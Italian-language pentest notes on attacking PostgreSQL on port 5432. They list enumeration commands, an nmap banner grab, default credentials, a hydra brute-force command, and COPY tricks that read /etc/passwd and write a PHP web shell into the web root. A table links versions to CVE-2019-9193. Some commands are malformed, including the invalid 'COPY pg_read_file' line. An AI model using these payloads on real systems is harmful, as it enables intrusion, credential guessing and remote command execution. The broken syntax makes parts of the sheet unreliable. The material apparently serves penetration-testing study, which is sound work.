
#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Comandi]]
- [[#Enumerazione e Banner Grabbing]]
- [[#Login Anonimo o Default]]
- [[#Bruteforce]]
- [[#Dump del Database]]
- [[#Comandi per File Read/Write]]
- [[#Versioni Vulnerabili]]

---
---
---
### Introduzione
_PostgreSQL_ è un potente RDBMS open source, spesso usato in ambienti enterprise.  
Opera sulla porta TCP/5432 ed è un target molto interessante per un pentester, soprattutto se:
- Esposto senza restrizioni
- Mal configurato
- Con credenziali deboli
- Accessibile da host compromessi

---
### Comandi

| **Comando**                                             | **Descrizione**                         |
| ------------------------------------------------------- | --------------------------------------- |
| `psql -h target.com -U user -d dbname`                  | Connessione al DB                       |
| `\l`                                                    | Elenca tutti i database                 |
| `\c nome_db`                                            | Connessione a un altro DB               |
| `\dt`                                                   | Lista tutte le tabelle del DB corrente  |
| `\d nome_tabella`                                       | Elenca colonne, tipi e vincoli          |
| `SELECT * FROM tabella LIMIT 10;`                       | Visualizza i primi 10 record            |
| `SELECT * FROM users;` \| `SELECT * FROM credentials;`  | Cerca tabelle comuni                    |
| `SELECT version();`                                     | Info versione PostgreSQL                |
| `\df`                                                   | Mostra le funzioni definite             |
| `\dx`                                                   | Mostra estensioni installate            |
| `COPY tabella TO '/tmp/output.csv' DELIMITER ',' CSV;`  | Scrive dati in file (richiede permessi) |
| `COPY tabella FROM '/tmp/input.csv' DELIMITER ',' CSV;` | Importa dati da file                    |
| `COPY pg_read_file('/etc/passwd', 0, 1000);`            | Legge file (solo superuser)             |
| `COPY (SELECT 'shell') TO '/var/www/html/shell.php';`   | Scrittura file su server                |
| `SELECT usename FROM pg_user;`                          | Elenco degli utenti DB                  |
| `\du`                                                   | Mostra utenti e permessi                |

---
### Enumerazione e Banner Grabbing
Verifica del servizio PostgreSQL:

```
nmap -p 5432 --script=pgsql-info target.com
```

Output possibile:

```
PostgreSQL DB 12.9 on x86_64-pc-linux-gnu
```

---

### Login Anonimo o Default
Prova accesso diretto con credenziali comuni:

```
psql -h target.com -U postgres
```

Oppure con password vuota:

```
psql -h target.com -U postgres -W
```

⚠️Credenziali predefinite comuni:
- `postgres:postgres`
- `admin:admin`
- `user:password`
- `root:` 

---
### Bruteforce PostgreSQL

```
hydra -L users.txt -P passwords.txt postgres://target.com
```

---
### Comandi per File Read/Write (solo con permessi elevati)
Leggere file:

```
COPY pg_read_file('/etc/passwd', 0, 1000);
```

Scrivere file (reverse shell PHP, cronjob, ecc.):

```
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

⚠️ Richiede il permesso `superuser` o `pg_write_server_files`.

---
### Versioni Vulnerabili

| **Versione**           | **CVE**       | **Writeup**                  |
| ---------------------- | ------------- | ---------------------------- |
| PostrgreSQL 9.6.0      | CVE-2019-9193 | [[Linux#Peppo\| Peppo]]     |
| PostgreSQL 11.3 - 11.9 | CVE-2019-9193 | [[Linux#Nibbles\| Nibbles]] |

